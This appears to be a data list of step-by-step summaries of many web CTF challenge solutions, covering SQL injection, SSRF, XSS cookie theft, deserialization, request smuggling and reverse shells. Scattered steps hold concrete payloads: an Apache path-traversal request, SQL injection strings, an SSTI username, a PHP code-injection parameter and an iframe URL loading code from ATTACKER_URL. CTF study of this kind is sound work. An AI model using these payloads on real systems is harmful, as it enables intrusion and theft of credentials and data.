    "Define a template for the final PDF files.",
    "Ensure the template holds identical initial content and MD5 hashes.",
    "Diverge the template at a certain point to create two different PDFs.",
    "Use the page count and PDFs list to write a manipulated 'hacked.pdf' file.",
    "Use the 'mutool clean' command to adjust the offsets in the PDF.",
    "Replace a specific string in the cleaned PDF data.",
    "Read the 'pdf1.bin' file.",
    "Read the 'pdf2.bin' file.",
    "Create 'collision1.pdf' with the predetermined prefix.",
    "Create 'collision2.pdf' with the predetermined prefix.",
    "Check the MD5 hash of 'collision1.pdf' using the hashlib library.",
    "Check the MD5 hash of 'collision2.pdf' using the hashlib library.",
    "Remove the intermediate 'merged.pdf' file.",
    "Remove the intermediate 'hacked.pdf' file.",
    "Use the 'mutool info -X' command to verify 'collision1.pdf'.",
    "Use the 'mutool info -X' command to verify 'collision2.pdf'.",
    "Upload 'collision1.pdf' to the challenge page.",
    "Upload 'collision2.pdf' to the challenge page.",
    "Investigate the source code provided.",
    "Understand how the application works and what needs to be exploited.",
    "Find that the '/display' page checks the session cookie.",
    "Identify the `very_auth` session variable that needs to be set to `admin`.",
    "Discover that the Flask session secret key is hardcoded into the source code.",
    "Add padding to the extracted text.",
    "Apply Base64 decoding to the padded text.",
    "Notice that the remainder of the session cookie is a signature.",
    "Understand that the signature is checked server-side to prevent tampering.",
    "Realize that the secret key needs to be cracked.",
    "Find the cookie name that matches the signature.",
    "Run the script.",
    "Discover that the secret key is 'butter'.",
    "Craft a new session cookie with the `very_auth` variable set to 'admin'.",
    "Utilize the secret key for crafting the new session cookie.",
    "Encode the session.",
    "Place the newly crafted cookie back into the application using Burpsuite.",
    "Observe the flag in the response after placing the cookie.",
    "Accessed the Startup Company web page.",
    "Identified a potential SQL injection point in the 'moneys=' parameter.",
    "Estimated the SQL query structure in the website's backend, taking into consideration the potential manipulation of the 'moneys=' parameter.",
    "Confirmed SQLite injection was possible by manipulating the 'moneys=' parameter and seeing the results in the green text.",
    "Confirmed the use of SQLite version 3.22.0.",
    "Retrieved table names from the database by manipulating the SQL query using 'moneys=' parameter.",
    "Used GROUP_CONCAT function to concatenate all retrieved table names into a single string.",
    "Retrieved column names of 'startup_users' table from the database using the SQL query.",
    "Used GROUP_CONCAT function to concatenate all retrieved column names into a single string.",
    "Dumped data from 'startup_users' table by using the SQL query and concatenating usernames using the GROUP_CONCAT function.",
    "Identified 'the_real_flag' user and suspected the flag to be in the 'wordpass' value.",
    "Retrieved the flag by dumping data from 'startup_users' table again, this time concatenating 'wordpass' values using the GROUP_CONCAT function.",
    "Access the provided URL",
    "Download the robots.txt file",
    "Attempt to navigate to /admin.phps",
    "Receive a 'Not Found' error",
    "Navigate to /index.phps",
    "Reveal source code for index.php",
    "Find a reference to authentication.php in the index.php code",
    "Navigate to /authentication.phps",
    "View the source code of authentication.php",
    "Reveal a 'require_once()' function call",
    "Include the cookie.php file",
    "View the source code of cookie.php",
    "Identify a potential PHP deserialization vulnerability in cookie.php",
    "$_COOKIE['login'] is deserialized",
    "Find the 'access_log' class in authentication.php",
    "The 'access_log' class has a '__toString()' function",
    "The '__toString()' function can return the contents of a file",
    "Understand the possibility of retrieving the flag by crafting and serializing a custom 'access_log' object",
    "The log_file of the 'access_log' object is set to '../flag'",
    "The flag retrieval is possible due to the deserialization of the 'login' cookie",
    "Construct a custom PHP script",
    "Decide to add the base64-encoded serialized object as a 'login' cookie in the browser",
    "Navigate to /authentication.php",
    "The 'access_log' class is defined in /authentication.php",
    "Understand the deserialization of the added cookie into an 'access_log' object",
    "The assignment to $perm triggers the catch block",
    "The flag is inadvertently printed in the catch block due to the '__toString()' method of the 'access_log' class",
    "Observe that the flag is revealed on the browser",
    "Accessed the website provided in the challenge",
    "Checked the filter page for clues or information",
    "Noticed the feature using SQLite through filters and SQL statements",
    "Created exploit using SQL injection: 'adm' || trim('in', ` Password: `) || ''",
    "Discovered that `||` is the SQLite concatenation operator and is used to join strings together",
    "Understood that trim(string, character) will remove `character` from `string`.",
    "Recognized that this SQL statement is equivalent to SELECT username, password FROM users WHERE username='adm' || 'in' || ''",
    "Realized finally that both SQL statements are identical to 'SELECT username, password FROM users WHERE username='admin''",
    "Logged in as admin using the discovered SQL injection",
    "Checked the filter page again to see any changes",
    "Attempted the third web Gauntlet where the length requirement is reduced",
    "Tried the previously discovered SQL injection, found that it still works",
    "Visited the URL provided in the problem statement.",
    "Identified that the web application might have an XPath injection vulnerability.",
    "Used automated tools or manual testing to check for error messages indicative of XPath Injection.",
    "If identified, manipulated the XPath query to bypass authentication mechanisms of the application.",
    "Once successful, noted the steps taken to reproduce the attack.",
    "Reported the findings on the platform provided for the CTF Challenge.",
    "Parsed the challenge PHP source code.",
    "Noted potential XXE vulnerability because of 'LIBXML_NOENT' flag in 'loadXML()' function.",
    "Created an LFI payload with a form.",
    "The form contains an XML part.",
    "Sent the payload to the server.",
    "Unable to find flag files.",
    "Confirmed that remote code execution (RCE) was necessary.",
    "Made a request to the file.",
    "Used 'php://filter/'",
    "Reflected the result into the 'user' tag of the HTML response.",
    "Analyzed 'phpinfo()' output.",
    "Identified 'disable_functions' configuration.",
    "Identified that functions for shell command execution were disabled.",
    "Used a recent exploit.",
    "Modified the payload script.",
    "Executed HTTP POST request to the target server.",
    "Included the final payload as part of form data.",
    "Received the flag as part of HTML response.",
    "Confirmed successful RCE exploited to get the flag.",
    "Started examining the Dockerfile provided.",
    "Identified a misconfiguration in the `apache.conf` file.",
    "Noticed that `<Directory />` is incorrectly set to refer to the filesystem directory and not the web root.",
    "Recognized this configuration grants access to any file on the filesystem.",
    "Checked server responses to identify Apache server version (2.4.49).",
    "Executed a GET request `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag.txt HTTP/1.1` to exploit this vulnerability.",
    "Retrieved the flag at `/flag.txt`.",
    "Accessed the provided web page http://wp6p6avs8yncf6wuvdwnpq8lfdhyjjds.ctf.sg:14719",
    "Accessed the Favicon of the webpage",
    "Found some encoded payload",
    "Found PHP script",
    "Interpreted the PHP script",
    "Found new endpoint for POST requests",
    "Noted that incoming data was saved into HTML files",
    "Found that http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/data.php lists all HTML files",
    "Noted that admin reads these HTML files",
    "Crafted an XSS payload to get the cookies of the admins",
    "Sent this XSS payload through the data endpoint",
    "Set up a server to catch the redirected request with admin cookies",
    "Accessed robots.txt to find interesting entries",
    "Set debug parameter to TRUE",
    "Noted filter size limitation",
    "Used the SQL injection payload to retrieve the flag",
    "Located a PHP webpage.",
    "Identified a login.php page.",
    "Investigated gallery.php.",
    "Noticed pictures of devices.",
    "Observed internal subnet addresses on the devices.",
    "Hypothesized that the login page might be filtering requests by the user's IP address.",
    "Used Burp Suite Intruder scan.",
    "Set the 'X-Forwarded-For' header to '192.168.3.16'.",
    "Located a form on the login page.",
    "Bypassed authentication.",
    "Logged in as the admin.",
    "Accessed a users.php page.",
    "Observed data containing usernames and card numbers.",
    "Searched for additional SQL injection endpoints.",
    "Accessed the URL /users.php?id=1.",
    "Fuzzed the input values.",
    "Identified a second SQL injection endpoint.",
    "Attempted various inputs.",
    "Encountered a blacklist filter preventing certain inputs.",
    "Utilized SQLMap.",
    "Initiated a database dump.",
    "Observed the 'users_data' database structure.",
    "Identified a column labeled 'R34L_F14G'.",
    "Noted that queries to this column return blank results.",
    "Realized the action fails due to the blacklist filter.",
    "Retrieved the flag 'S3D{G0_De3Per_L1k3_a_pr0_r3d_T3aMEr}'.",
    "Intercept the HTTP request",
    "Modify the HTTP GET parameter",
    "Set the GET parameter to 'print=echo+'';phpinfo()'",
    "Observe the result",
    "Notice the validation of arbitrary code execution",
    "Enable the 'debug' option",
    "Examine the source code of the page",
    "Identify the variables $blocked, $special_block, and $$special_block",
    "Recognize that they are defined before the 'eval()' statement",
    "Understand that they can be referenced in the eval-ed code",
    "Understand the concept of $$ variable in PHP",
    "Analyze how $$ variable is used in the code",
    "Observe the execution of eval function",
    "Realize that eval does not display the output",
    "Use print to display the output",
    "Observe the retrieval of the flag",
    "Visited the challenge website.",
    "Tried to understand how the website works.",
    "Identified an admin bot script provided by the challenge.",
    "Used Chrome DevTools.",
    "Analyzed the notes app's JavaScript source code.",
    "Discovered that the app uses local storage to save notes.",
    "Learned that the search feature places the query into the URL's fragment identifier.",
    "Saw that search results affect which image loads.",
    "Understood that the admin bot visits any URL provided.",
    "Understood that the admin bot stores a flag as a note on the challenge server before visiting the URL.",
    "Realized it might be possible to force the admin bot to perform a search function on the server.",
    "Considered using a cache probing attack to detect whether a search was successful.",
    "Considered using the presence of 'y.png' or 'n.png' in the cache as an indicator of search success.",
    "Constructed a JavaScript payload to be run on the victim's browser.",
    "The payload measures the time taken to fetch 'y.png'.",
    "Discovered that headless mode of Chrome doesn't perform cache partitioning.",
    "Realized that this allows the cache probing attack to succeed.",
    "Realized that the cache is not separated between headless and non-headless Chrome instances.",
    "Found out the intended solution involves bypassing the cache partitioning.",
    "Noted that subdomains and port numbers are ignored in cache keys.",
    "Identified that the website is a GitHub Pages site.",
    "Noted that the site does not require proof of domain ownership.",
    "Created a new GitHub Pages site.",
    "Deployed the previously developed JavaScript payload.",
    "The payload is deployed to the new GitHub Pages site.",
    "Locate the 'app.py' file",
    "Recognize the existence of the 'new chat' feature",
    "Observe the sending of an SMS",
    "Identify the utilization within the 'send_sms' function",
    "Understand the control of the resulting template",
    "Recognize 'login' as the user-controllable portion",
    "Recognize the potential for Server-Side Template Injection (SSTI)",
    "Identify the 'add_money_to_login' function added to the template context",
    "Create two user accounts",
    "Set one of the usernames as '{{ add_money_to_login(USERNAME, AMOUNT_OF_MONEY) }}'",
    "Compose an SMS message",
    "Accumulate a significant amount of money",
    "Utilize the aforementioned method for money generation",
    "Access the flag purchase system",
    "Use the acquired financial resources to purchase the flag",
    "Identify a user profile.",
    "Understand each book's URL structure on server.",
    "Observe the behavior of file downloads.",
    "Attempt to upload a file.",
    "Choose a .php file for upload.",
    "Intend to run arbitrary PHP code.",
    "Realize the filtering of .php extensions.",
    "Notice the recursive nature of the filtering.",
    "Test different file extensions.",
    "Navigate to the uploaded webshell.",
    "Execute the command cat /flag.txt.",
    "Given the /request endpoint from challenge.",
    "Identified behavior: if the host is not found or the URL is invalid, a specific message is returned.",
    "Identified behavior: if SSRF is detected, a specific message is returned.",
    "Blacklist works based on 'localhost' and '127'.",
    "Understood that the server uses Python's requests library to issue GET requests to the submitted URL.",
    "Returns response headers.",
    "Found a way to bypass the localhost blacklist by using an alternative representation of '127.0.0.1', like '0177.0.0.1'.",
    "Bypassed filter.",
    "Performed an internal port scan for ports between 5000 and 10000.",
    "Found out that ports 8080 and 9006 were open.",
    "Identified content lengths as indicators of page existence due to uniform content length of Not Found (404) pages.",
    "Identified that the page at port 8080 is the same as the public challenge site.",
    "Tried to access port 9006 directly but didn't get meaningful information.",
    "Given an endpoint that allows sending feedback in form of HTML.",
    "Discovered that arbitrary HTML submitted is rendered by the admin's browser.",
    "Introduced three separate payloads in the HTML.",
    "Extracted the page URL.",
    "Learned that our submitted HTML was the only content present on the page.",
    "Used the discovered page URL (`http://0.0.0.0/Secret_admin_cookie_panel`)",
    "Identified a `/flag` endpoint.",
    "Endpoint had been inaccessible due to lack of the appropriate cookie.",
    "Revisited the page with the newly acquired 'admin' cookie.",
    "Revealed the flag.",
    "Inspect the given source code.",
    "Identify the '/guest' endpoint.",
    "Recognize that there's a well-known deserialization vulnerability in node.js.",
    "Understand that this vulnerability could lead to Remote Code Execution (RCE).",
    "Understand that RCE can be achieved by passing a serialized object into 'serialize.unserialize()'.",
    "Understand that a JavaScript Immediately Invoked Function Expression (IIFE) can be used for RCE.",
    "Plan to execute a reverse shell payload.",
    "Craft a reverse shell payload using 'nodejsshell.py'.",
    "Copy the output from the crafted reverse shell payload.",
    "Paste the copied output into the function body.",
    "Test the payload to ensure it works.",
    "Encode the payload to base 64.",
    "Send the encoded payload through the cookie header.",
    "Checked source code.",
    "Understood that 'JSON.parse' allows the '__proto__' key.",
    "Noticed that causing a TypeError triggers the 'require('./usage')'.",
    "Interpreted how 'pkg' and 'pkgPath' can be controlled.",
    "Found out that 'pkg' is an object containing the 'package.json' fields.",
    "Found out that 'pkgPath' is the path to this package.",
    "Found that we can load any JavaScript file.",
    "Found '/opt/yarn-v1.22.19/preinstall.js' in the container.",
    "Identified that 'child_process.execFileSync' is being called in 'preinstall.js'",
    "Realized that 'process.env.npm_execpath' can be controlled.",
    "Set 'process.env.npm_execpath' to a controlled value.",
    "Figured out how to use '--eval' option to run inline JavaScript.",
    "Realized JSON payload cannot have spaces due to regex match.",
    "Used '${IFS}' to get around the regex match restriction.",
    "Exfiltrated the '/readflag' output using the defined payload.",
    "Sent the payload to the HTTP server.",
    "Received the flag from the HTTP server.",
    "Visit the webpage.",
    "Download the `openapi.json` file.",
    "Investigate the requirements and specifications of an uploaded zip file.",
    "Check if the uploaded zip file should contain a `run` bash script.",
    "Create a zip file.",
    "Add a `run` bash script to the zip file.",
    "Upload the zip file.",
    "Read the first flag.",
    "Perform the action with `nobody` user permissions.",
    "View the source code of the program.",
    "Understand that gaining a shell inside the docker container could provide more privileges.",
    "Write a binary.",
    "Compile the binary.",
    "Set the effective user and group IDs to that of the SUID and SGID permissions.",
    "Increase the privileges.",
    "Read the second flag.",
    "Identify that the challenge consists of 3 services - Traefik (a HTTP proxy)",
    "Identify that the challenge consists of 3 services - a Python microservice",
    "Identify that the challenge consists of 3 services - a Go microservice",
    "Observe the configuration file of the Traefik service",
    "Examine the Go microservice",
    "Evaluate the Python microservice",
    "Realize the challenge of reaching the Python microservice that only accepts the PUT method",
    "Inspect the Beego source code",
    "Make a request to the Go microservice using a POST method",
    "Include a '_method=PUT' query parameter in the request",
    "Identify that the Python microservice runs on Flask's built-in server",
    "Navigate the HTTP request smuggling attack",
    "Setup a request",
    "Cause a GET request to the Python microservice to be executed",
    "Smuggle the GET request inside a POST request made to the Go microservice",
    "Use HTTP request smuggling techniques",
    "Get a reverse shell on the Python microservice",
    "Obtain the flag",
    "Read the given challenge.",
    "Understand that the challenge involves investigating an unintentionally exposed internal API and finding a flag.",
    "Spot an interesting behavior with 'RegExp.prototype.test()' used with regex containing the global flag.",
    "Submit the same payload multiple times.",
    "Bypass the regex using the provided loophole.",
    "Understand the requirement of a 'Buffer' of 16 bytes.",
    "Understand the necessity of having at least 32 characters in the 'fqdn'.",
    "Leverage the behavior of 'Buffer' stopping at the first non-hexadecimal character.",
    "Derive a URL that starts with 32 bytes of hexadecimal characters using leading 0's.",
    "Ensure the trailing '.ping-proxy/ping' turns into a URL fragment.",
    "Append '#' at the end of the 'fqdn' to make the final URL your public IP address.",
    "Receive the request.",
    "Observe the flag in the request header.",
    "Claim the flag.",
    "Complete the challenge.",
    "Load the CTF challenge.",
    "Look into the provided source code to understand how the application works.",
    "Notice that the application is a 'screenshotter' service.",
    "Observe that the service doesn't allow for file:// protocol.",
    "Observe that the service validates the URL to be HTTP(S).",
    "Read the function getBrowserWithTimeout.",
    "Consider that the debugging port is randomized.",
    "Formulate a strategy to leak the debugging port.",
    "Understand that the port scan needs to be completed before the browser instance is closed.",
    "Code a web page that uses a Promise.",
    "If the URL loads, log that the port is open.",
    "Deploy this page on a server.",
    "Point the 'screenshotter' service to the deployed page.",
    "Create the server script.",
    "Request Chromium to open a new webpage.",
    "Target the URL file:///tmp/flag.txt.",
    "Use the obtained port number for the request.",
    "Display the flag in the browser instance.",
    "Fetch the screenshotter service.",
    "Put the result in an iframe.",
    "Display the iframe in the screenshotting service.",
    "Take the screenshot of the flag.",
    "Extract the flag from the converted text.",
    "Build a second-stage exploit.",
    "The JavaScript sends a POST request.",
    "Visit the website.",
    "Observe the URL http://asuna.nullsession.pw.",
    "Try using /search as per instructions in the response.",
    "Test classic SQL Injection payloads.",
    "Receive 403 Forbidden.",
    "Notice the 'Server' header in HTTP response.",
    "Review the AWS WAF documentation.",
    "Test a trivial payload.",
    "Use a payload with a length over 8kB.",
    "Confirm that the payload is not blocked.",
    "Ensure the payload exceeds 8kB.",
    "Use the tamper script with SQLMap.",
    "Dump the database.",
    "Find flag in the database dump.",
    "Visited the website.",
    "Observed that there is a proxy server and a backend server accessible at provided URLs.",
    "Inspected the proxy server.",
    "Noticed that the proxy server makes a request to the backend server.",
    "Understood that a user-controlled 'uri' is involved in the attack.",
    "Discovered that the 'uri' is appended to the backend URL using Python's urllib.parse.urljoin.",
    "Realized the issue with urllib.parse.urljoin.",
    "Identified that urllib.parse.urljoin can return the appended path as the base URL when handling malformed paths.",
    "Exploited the issue in urllib.parse.urljoin.",
    "Formed a request to the proxy server.",
    "Received a request from the proxy server.",
    "Obtained knowledge of the 'secret' token.",
    "Used the 'secret' token to send a request directly to the backend server.",
    "Learned that the backend server checks for the 'secret' cookie.",
    "Discovered that the flag is returned by the backend server only if the 'secret' cookie is present.",
    "Obtained the flag 'CTFSG{d0nT_toUcH_mY_c00k13s}'.",
    "Identify the end goal as getting access to /flag.",
    "Note that the JWT token needs to have the role attribute changed to admin.",
    "Study the registration and login process.",
    "Note that a JWT key is created for each new user during registration.",
    "Understand that the JWT key is used to sign the token during login.",
    "Identify the caching mechanism for user JWT keys.",
    "Note that each user's JWT key is stored in a Redis cache.",
    "Observe that the JWT key is only stored for 2 seconds.",
    "Explore the non-admin path, /sakura.",
    "Identify the endpoint /rin that uses SSRF code.",
    "Realize that by adding X-Forwarded-For: 127.0.0.1, an SSRF is possible to the /sakura endpoint.",
    "Understand that the SSRF request must be made immediately after login.",
    "Use the JWT secret to create a JWT with the admin role.",
    "Utilize https://jwt.io/ or a JWT-signing library for the JWT creation.",
    "Make a request to /flag using the new admin JWT token.",
    "Retrieve the flag from the response.",
    "Used the provided URL for registration.",
    "Search for vulnerabilities in other functions.",
    "No flaws found in OTP verification logic.",
    "Examined the search function.",
    "Identified a potential SQL Injection vulnerability.",
    "Exploited the SQL Injection protection bypass.",
    "Utilized MySQL comments to act as spaces.",
    "Crafted payload '/search?q=socengexp'/**/AANDND/**/(SUBSTR(otp,<POSITION>,1))='<GUESS>'.",
    "Brute-forced the OTP character by character.",
    "Used the obtained OTP for verification and login.",
    "Accessed the '/cornelia' URL.",
    "Performed a GET request on the chosen URL.",
    "Identified a Server Side Request Forgery (SSRF) vulnerability.",
    "Realized that direct exploitation of SSRF is not possible.",
    "Leveraged the server's behavior of following redirects.",
    "Retrieved the flag 'CTFSG{All_T00_W3ll_T3n_M1nutes_V3rs1on_Taylors_Version}'.",
    "Access the website at the URL: http://chals.ctf.sg:40401",
    "View the source code of the PHP page",
    "Locate the PHP script that compares the md5 hashes of 'i1' and 'i2'",
    "Comprehend the loose comparison ('==') operator used in PHP to compare two md5 hashes",
    "Learn that if a string starts with '0e...' in PHP, it is treated as a float with the value 0.0",
    "Execute PHP commands to confirm the behavior of '0e...' strings being treated as 0.0 in PHP",
    "Acknowledge the existence of 'magic hashes' that PHP considers equal",
    "Consult a list of strings that generate these 'magic hashes' in PHP",
    "Select two strings from the 'magic hash' list that have a length of 15 or more characters",
    "Generate a GET request to the page, with the chosen strings as the values for 'i1' and 'i2'",
    "Receive a server response containing the flag value: 'CTFSG{you_see_me_in_h1nds1ght_tangled_up_with_you_all_night}'",
    "Analysed the `main.dart.js`.",
    "Recognized that `main.dart.js` is the Flutter app compiled by `dart2js`.",
    "Discovered an `AdminPage`.",
    "Identified a `/api/flag` endpoint.",
    "Recognized that the `/api/flag` endpoint is fetched using `postRequestWithCookies`.",
    "Identified a `/api/token` endpoint.",
    "Recognized that the `/api/token` endpoint is in `LoginPage`.",
    "Examined features of the application.",
    "Attempted XSS payloads.",
    "Realized that rendering unescaped HTML was unsuccessful.",
    "Recognized that the app is rendered on a `<canvas>`.",
    "Manipulated the `widget` parameter.",
    "Caused a traceback.",
    "Used `Access-Control-Allow-Origin: *` header.",
    "Identified the remote Flutter widget file signature.",
    "Decoded the `chatmessage` widget.",
    "Tried to manipulate the `clipboard_getData` function.",
    "Found the `clipboard_getData` function in `main.dart.js`.",
    "Took a closer look at `poll.dart`.",
    "Recognized the Mechanism `ApiMapper` in `poll.dart`.",
    "Found a mechanism to fetch the poll options.",
    "Modified the `ApiMapper`.",
    "Modified the GET request.",
    "Used the `onLoaded` event handler.",
    "Obtained the admin's token.",
    "Fetched the flag.",
    "Access the webpage.",
    "Observe the interface to a router with a ping functionality.",
    "Discover that using a sufficiently large 'id' can cause an out-of-bound memory read.",
    "Enumerate the 'id' range between '18446744073709551463' to '18446744073709551615'.",
    "Realize that the RAM can be dumped using this technique.",
    "Retrieve data from the response.",
    "Append the decoded result to a file.",
    "Perform a string search on the 'out.bin' file.",
    "Find a potential flag in the search results.",
    "Guess that the flag is 'FLAG{r0uter_p0rtals_are_ultimately_impenetrable_because_they_are_real_weird}'.",
    "Review the site's JavaScript.",
    "Understand that the 'demo()' function is called on the 'demo' GET request parameter.",
    "Realize that this results in the setting of the innerHTML of the 'result' element.",
    "Discover the 'mock()' function.",
    "Understand that it is a wrapper function.",
    "Realize that it runs the function exposed by the WASM module.",
    "Identify that the WASM module uses the 'str.length' to validate the buffer.",
    "Realize that the buffer length can be less than the number of characters written into it.",
    "Understand that this is due to inconsistencies in length measurement of Unicode characters.",
    "Find that the Unicode character '\u00df' turns into two characters 'SS' when converting to upper case.",
    "Modify the initial JavaScript payload.",
    "Run the Python script.",
    "Place the URL-encoded string in the URL parameter 'demo'.",
    "Analyzing the provided Javascript and Dockerfile scripts.",
    "Noticing the main class, Database, which creates, retrieves and generates tokens for notes.",
    "Identifying that process.env.FLAG in db.createNote({ data: process.env.FLAG }) is storing the flag.",
    "Discovering a programming error where crypto.randomUUID (the function) is used as the secret, instead of calling it.",
    "Understanding that the secret is not 'secret-[random UUID]' as expected, but it is the string: 'secret-function randomUUID(options) { if (options !== undefined) validateObject(options, 'options'); const { disableEntropyCache = false, } = options || {}; validateBoolean(disableEntropyCache, 'options.disableEntropyCache'); return disableEntropyCache ? getUnbufferedUUID() : getBufferedUUID(); }'.",
    "Using the method 'db.generateToken(0)' to generate the token.",
    "Submitting the generated token to retrieve the flag.",
    "Study and understand the given client-side web exploitation challenge.",
    "Visit the URL submitted to the '/share' endpoint by an admin bot.",
    "Identify the '/queue' WebSocket endpoint.",
    "Check if the client has the correct 'auth' cookie set.",
    "Understand that the correct 'auth' cookie is set at the '/auth' endpoint.",
    "Confirm that the request to the '/auth' endpoint is made locally by the admin bot.",
    "Perform a GET-based CSRF through a top-level navigation.",
    "Understand that the WebSockets library used is flask_sockets.",
    "Realize that there is no vulnerability in the ws.origin.",
    "Notice that ws.origin corresponds to the Origin request header.",
    "Realize that the exploit page's origin must start with 'http://localhost'.",
    "Acknowledge that there is no known way to bypass the requirement for 'http://localhost' as the origin.",
    "Manipulate the fact that WebSocket connection validation does not guarantee that the page is hosted on localhost.",
    "Consider using a domain starting with localhost, such as localhost.zeyu2001.com.",
    "Identify that CSRF token is not being checked.",
    "Recognize that WebSockets are not restricted by the Same-Origin Policy.",
    "Construct a page hosted on a domain starting with 'localhost'.",
    "Submit the constructed page to the '/share' endpoint.",
    "Open a WebSocket to 'ws://localhost:7070/quote'.",
    "Analyse PHP code.",
    "Understand regex filter on 'f' parameter.",
    "List permitted characters.",
    "Bypass character filter.",
    "Use wildcard '?' to match any single character.",
    "Access '/etc/hosts' file.",
    "Read binary '/readflag'.",
    "Download binary.",
    "Identify string 'sRPd45w_0' in decompiled code.",
    "Recognize rearrangement as 'P4s5_w0Rd'.",
    "Understand permission of pipe character '|'.",
    "Terminate 'cat' command with '|'.",
    "Execute new command.",
    "Use character substitution '$()'.",
    "Execute '/usr/bin/strings /readflag' command.",
    "Read strings from the binary.",
    "Retrieve only 'P4s5_w0Rd' string.",
    "Construct regex pattern.",
    "Pass obtained string as argument to '/readflag'.",
    "Result in 'Wrong Password!' message.",
    "Recognize the need to rearrange password.",
    "Recognize correct rearrangement as 'sRPd45w_0'.",
    "Reconstruct into 'sRPd45w_0' string.",
    "Run script.",
    "Obtain flag.",
    "Found potential injection points in the feature allowing us to edit our bio in Markdown.",
    "Saw that the Markdown was parsed using 'marked' and 'DOMPurify'.",
    "Checked the version numbers of these libraries and searched for security vulnerabilities without any results.",
    "Looked more into Jinja2 and found the 'safe' filter that renders unescaped HTML.",
    "Identified the HTML injection vector via 'profile.html' template.",
    "Realized a '<script>' payload wouldn't work due to Content Security Policy blocking arbitrary scripts without a randomly-generated nonce.",
    "Leveraged the '<base>' HTML tag to set the base URL for all relative URLs in the document, helping bypass the Content Security Policy.",
    "Intended to load the '/static/js/marked.min.js' files from a different URL to exploit the script tags being part of the original template.",
    "Started a HTTP server, created the '/static/js' directory structure, and placed XSS payload in 'marked.min.js'.",
    "Injected '<base href=\"http://HOST:PORT\">' into the profile via 'user['title']' or 'user['lab']'.",
    "Identified the challenge as involving wkhtmltopdf, a tool that translates HTML content into a PDF.",
    "Understood that the input had to satisfy certain constraints, chiefly that 'name' could only contain alphanumeric characters, and 'email' had to pass RFC5322 validation.",
    "Used knowledge of these constraints to aim exploitation efforts at the more forgiving 'email' parameter.",
    "Examined the documentation for RFC5322 to understand what characters are allowed in the email parameter.",
    "Discovered that it allows for a domain-literal format, which permits just about any printable ASCII character.",
    "Found the server endpoint was also vulnerable to Server-Side Template Injection (SSTI).",
    "Analyze the given Python script",
    "Identify the structure of the Python script",
    "Identify the functionality of the Python script",
    "Access the requirements.txt file",
    "Identify the version of SQL Alchemy",
    "Learn about the older version of SQLAlchemy",
    "Recognize the vulnerability of the older version to an SQL injection attack",
    "Observe the vulnerability's location after the ORDER BY clause",
    "Recognize the challenge in exploiting the vulnerability",
    "Learn about using the CASE clause to determine the column of the result being sorted",
    "Learn about the SQLite code",
    "Identify the vulnerable order_by() function",
    "Learn that the SQLite code can be injected into the vulnerable order_by() function",
    "Identify the payload",
    "If the character matches 5, set the LIMIT to 1",
    "If the character does not match 5, set the LIMIT to 2",
    "Compare the response header with the chosen character",
    "Identify if the chosen character is correct based on the response header",
    "Check if no character in the alphabet is causing a change in content length",
    "Break the script if no character is causing a change in content length",
    "Explored the website functionality",
    "Discovered an image rendering feature that places text onto a T-shirt image",
    "Conducted fuzzing",
    "Discovered that HTML injection is possible",
    "Tried to load an external resource (JavaScript or stylesheet)",
    "Identified that the user agent is `wkhtmltoimage`",
    "Through the request captured",
    "Recognized a potential SSRF vulnerability associated with `wkhtmltoimage`",
    "From previous knowledge and references",
    "Hosted the payload on an external website",
    "Triggered the payload through an iframe by entering that into the webpage's input field",
    "URL format: `http://challenge.nahamcon.com:32132/exploit?text=%3Ciframe%20src=%22https://ATTACKER_URL/exploit.html%22%3E&color=%2324d600`",
    "The payload executed successfully",
    "Searched the leaked contents of the admin page",
    "Understand that the XSS vulnerability can enable CSRF attacks on the admin.",
    "Target '/reset2fa' as the destination of the POST request.",
    "Aim to reset the admin's 2FA code through the POST request.",
    "Include 'credentials: include' in the request to bypass same-origin policy restrictions.",
    "Wait for the promise to resolve.",
    "Use the 'fetch' function to send the response text to an external URL.",
    "Decode the 2FA token received from the previous step.",
    "Obtain the admin 2FA code from the decoded token.",
    "Use the 2FA token on an authenticator application.",
    "Generate the admin 2FA codes with the authenticator application.",
    "Send a POST request to '/show_secret'.",
    "Include the stolen 2FA codes in the request.",
    "Include 'Content-Type: application/json' in the request header.",
    "Include 'otp' and 'secretId' in the request body.",
    "Wait for the promise to resolve.",
    "The response text contains the secrets.",
    "Decode the base64-encoded string received from the previous step.",
    "Analyzed the JavaScript source.",
    "Reviewed the challenge.",
    "Identified the use of a message event handler.",
    "Identified the need for a '.jsapi.tech' subdomain takeover.",
    "Recognized the ability to 'preview' HTML without saving it.",
    "Noted the use of DOMPurify for HTML sanitization.",
    "Identified a loophole in the 'search' feature.",
    "Recognized that 'this.noteData' remained the same after sanitization.",
    "Encountered an issue with the 'search' feature.",
    "Utilized DOM clobbering.",
    "Overrode the 'window.enable_experimental_features' property.",
    "Inserted HTML through 'preview' feature.",
    "Unintended solution using 'Lazy-loading' property.",
    "Checked for an extra div when search is correct.",
    "Concluded the extra div was rendered when no request is received.",
    "Determined a correct guess for the search.",
    "Different intended solution using 'PerformanceLongTaskTiming API'.",
    "Checked if the search took more than 50ms.",
    "Discovered that any timing attack with 'performance.now()' would have worked.",
    "Executed the timing attack.",
    "Visited the website 'https://chall1.jsapi.tech'.",
    "Observed the HTML interface for writing and saving notes.",
    "Examined the site's JavaScript script 'script.js'.",
    "Identified the message event handler added to the window.",
    "Verified that the event handler is added after meeting several checks.",
    "Checked if the 'enableapi' query parameter was set to 'true'.",
    "Checked if the 'recv' query parameter was a subdomain of 'jsapi.tech'.",
    "Checked if the window was framed or opened by another window.",
    "Discovered that the subdomain 'jsapi.tech' points to 'sohomdatta1.github.io'.",
    "Verified the GitHub pages site at 'asdf.jsapi.tech' can be served.",
    "Examined the code to understand the note saving mechanism.",
    "Identified the addition of note contents to the 'data-last' attribute of the '#note-text-area' element.",
    "Noted the usage of DOMPurify v2.3.0 tool for sanitizing the note.",
    "Verified that 'link' and 'style' tags are explicitly permitted during sanitization.",
    "Understood the condition for adding DOMPurify-sanitized HTML into the child iframe.",
    "Noted that the postMessage should start with 'NOTE_APP_SET_REQUEST' to trigger the addition.",
    "Discovered a workaround to fix the loading behaviour.",
    "Realized that the 'data-last' attribute contains the victim's saved note.",
    "Identified the CSS rule with 'background' property.",
    "Realized that the 'data-last' attribute should start with the correct string for it to be fetched.",
    "Understood the process of flag brute-forcing.",
    "Realized that all possible characters are guessed for each position of the flag.",
    "Examined the Python script used for the attack.",
    "Noted the usage of the Python script to generate CSS.",
    "Saved the generated CSS in 'exploit.css'.",
